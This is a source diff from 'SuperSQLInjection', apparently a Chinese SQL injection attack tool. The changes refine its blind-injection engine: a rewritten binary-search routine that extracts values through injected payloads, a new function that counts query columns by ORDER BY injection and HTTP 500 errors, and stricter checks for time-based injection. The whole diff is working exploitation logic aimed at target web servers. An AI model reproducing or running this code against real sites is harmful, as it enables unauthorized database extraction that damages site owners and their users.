@@ -284,7 +284,7 @@ namespace SuperSQLInjection
             responseStream.Close();
         }
 
-        public static int version = 20190813;
+        public static int version = 20190823;
         public static string versionURL = "http://www.shack2.org/soft/getNewVersion?ENNAME=SSuperSQLInjection&NO=" + URLEncode.UrlEncode(Tools.getSystemSid()) + "&VERSION=" + version;
         //检查更新
         public void checkUpdate()
@@ -2683,39 +2683,122 @@ namespace SuperSQLInjection
         /// <param name="start">开始值</param>
         /// <param name="end">最大值</param>
         /// <returns></returns>
+        /// <summary>
+        /// 二分法判断
+        /// </summary>
+        /// <param name="payLoadStr">获取数据paylaod</param>
+        /// <param name="start">开始值</param>
+        /// <param name="end">最大值</param>
+        /// <returns></returns>
         public int getValue(String payLoadStr, int start, int end)
         {
             int len = 0;
             String payload = "";
             int min = start;
             int olen = 0;
+            Boolean lastexists = false;
             while (status == 1)
             {
                 //2分法获取中间数字
                 len = Tools.getLargeNum(start, end);
-                if (olen == len)
-                {
-                    len = end;
-                    break;
-                }
-                olen = len;
+                
                 payload = ByPassForBetween(payLoadStr, len);
                 ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                 Boolean exists = Tools.isTrue(server, config.key, config.reverseKey, config.keyType, config.injectHTTPCode);
-                if (exists)
+
+                if (end - start == 1)
                 {
-                    if (len == start)
+                    if (!lastexists && exists)
                     {
                         return end;
                     }
+                    else if (lastexists && !exists)
+                    {
+                        return start;
+                    }
+                }
+                if (len == start)
+                {
+                    if (exists)
+                    {
+                        return end;
+                    }
+                    else {
+                        return start;
+                    }
+                    
+                }
+
+                olen = len;
+                lastexists = exists;
+                if (exists)
+                {
+                    
                     start = len;
                 }
                 else
                 {
-                    if (len == start)
-                    {
-                        return len;
+                    end = len;
+                }
+                
+            }
+            return len;
+        }
+
+        public int getOrderByColumns(String payLoadStr, int start, int end)
+        {
+            int len = 0;
+            String payload = "";
+            int min = start;
+            int olen = 0;
+            //最小1是否报错，最大1000是否报错
+            payload = ByPassForBetween(payLoadStr, 1);
+            ServerInfo server_1 = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+            Boolean use_error = false;
+            Boolean lastexists = false;
+            payload = ByPassForBetween(payLoadStr, 1000);
+            ServerInfo server_1000 = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+
+            if (server_1.code == 200 && server_1000.code == 500)
+            {
+                use_error = true;
+            }
+
+            while (status == 1)
+            {
+                //2分法获取中间数字
+                len = Tools.getLargeNum(start, end);
+                if (end - start == 1)
+                {
+                    if (lastexists) {
+                        return end;
                     }
+                    return start;
+                }
+                payload = ByPassForBetween(payLoadStr, len);
+                ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                Boolean exists = false;
+                if (use_error)
+                {
+                    if (server.code != 500)
+                    {
+                        exists = true;
+                    }
+                }
+                else
+                {
+                    exists = Tools.isTrue(server, config.key, config.reverseKey, config.keyType, config.injectHTTPCode);
+                }
+
+                olen = len;
+                lastexists = exists;
+
+                if (exists)
+                {
+                    start = len;
+                }
+                else
+                {
                     end = len;
                 }
             }
@@ -7017,7 +7100,7 @@ namespace SuperSQLInjection
                                 String cpayload = pals[0].Replace("{time}", time.ToString());
                                 this.txt_log.Invoke(new showLogDelegate(log), "正在测试PayLoad:" + cpayload, LogLevel.info);
                                 ServerInfo sleepServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, cpayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
-                                if (sleepServer.runTime > time * 1000-Tools.deviation)
+                                if (sleepServer.runTime > (time * 1000-Tools.deviation)&& sleepServer.runTime<config.timeOut*1000)
                                 {
                                     //再次发包测试，降低误报
                                     sleepServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, cpayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
@@ -7304,15 +7387,15 @@ namespace SuperSQLInjection
                         {
                             orderpayload = orderpayload + "-- -";
                         }
-                        order = getValue(orderpayload, 1, config.maxClolumns);
+                        order = getOrderByColumns(orderpayload, 1, config.maxClolumns);
                     }
                     int startIndex = 1;
                     int endIndex = config.maxClolumns;
                     if (order - 1 > 0)
                     {
-                        startIndex = order - 1;
+                        startIndex = order;
                         endIndex = startIndex;
-                        this.txt_log.Invoke(new showLogDelegate(log), "注入点支持order by判断，自动判断查询有" + startIndex + "列！", LogLevel.success);
+                        this.txt_log.Invoke(new showLogDelegate(log), "注入点支持order by判断，自动判断查询有" + order + "列！", LogLevel.success);
                     }
 
                     //判断总列数
@@ -7543,8 +7626,11 @@ namespace SuperSQLInjection
         public void selectDB(String currentDB)
         {
             DBType dbtype = Tools.caseDBType(currentDB);
-            this.cbox_basic_dbType.SelectedIndex = (int)dbtype;
-            this.txt_log.Invoke(new showLogDelegate(log), "自动选择数据库类型完成！", LogLevel.info);
+            int cdb = (int)dbtype;
+            if (cdb!=0) {
+                this.cbox_basic_dbType.SelectedIndex = (int)dbtype;
+                this.txt_log.Invoke(new showLogDelegate(log), "自动选择数据库类型完成！", LogLevel.info);
+            }
         }
 
         private void data_dbs_tsl_getDatas_Click(object sender, EventArgs e)
